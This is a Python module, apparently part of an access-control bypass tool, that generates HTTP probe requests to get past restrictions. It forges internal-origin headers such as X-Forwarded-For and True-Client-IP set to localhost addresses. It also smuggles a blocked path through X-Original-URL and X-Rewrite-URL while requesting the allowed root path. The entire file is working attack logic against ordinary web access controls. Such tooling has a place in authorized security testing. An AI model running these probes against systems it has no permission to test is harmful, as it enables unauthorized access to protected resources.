"""HTTP header techniques.

Two ideas:
  1. Trust headers: the access control trusts headers it assumes only internal
     infrastructure sets (X-Forwarded-For, etc.). We forge an internal/localhost
     identity to look like trusted traffic.
  2. Rewrite headers: some stacks (IIS/ASP.NET, certain nginx configs) re-route
     based on X-Original-URL / X-Rewrite-URL AFTER the access check has already
     run against the request line. We request an allowed path ("/") and smuggle
     the blocked path in the header.
"""
from __future__ import annotations

from typing import Iterator

from ..core.models import Request, Probe, TargetProfile

# Headers that some access rules trust as "set only by internal infra".
_TRUST_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Forwarded-Host", "X-Host",
    "True-Client-IP", "Cluster-Client-IP", "X-Custom-IP-Authorization",
    "Forwarded",
]
# Kept short on purpose: 127.0.0.1 and ::1 cover the vast majority. Tune in config.
_IPS = ["127.0.0.1", "localhost", "::1"]

# Headers that re-route to a path AFTER the access check.
_REWRITE_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "Referer"]


class HeaderTechnique:
    name = "headers"

    def applies_to(self, profile: TargetProfile) -> bool:
        return True

    def generate(self, target: Request, profile: TargetProfile) -> Iterator[Probe]:
        # 1. trust spoofing -- keep the original path, add a forged-origin header
        for h in _TRUST_HEADERS:
            for ip in _IPS:
                value = f"for={ip}" if h == "Forwarded" else ip
                yield self._probe(
                    target, target.raw_path,
                    {**target.headers, h: value}, f"{h}: {value}",
                )
        # 2. rewrite -- hit an allowed path "/" but smuggle the blocked one
        for h in _REWRITE_HEADERS:
            yield self._probe(
                target, "/",
                {**target.headers, h: target.raw_path},
                f"{h}: {target.raw_path}  (request path = /)",
            )

    def _probe(self, target, raw_path, headers, label) -> Probe:
        return Probe(
            technique=self.name,
            label=label,
            request=Request(
                method=target.method,
                url=target.url,
                raw_path=raw_path,
                headers=headers,
                http_version=target.http_version,
            ),
        )
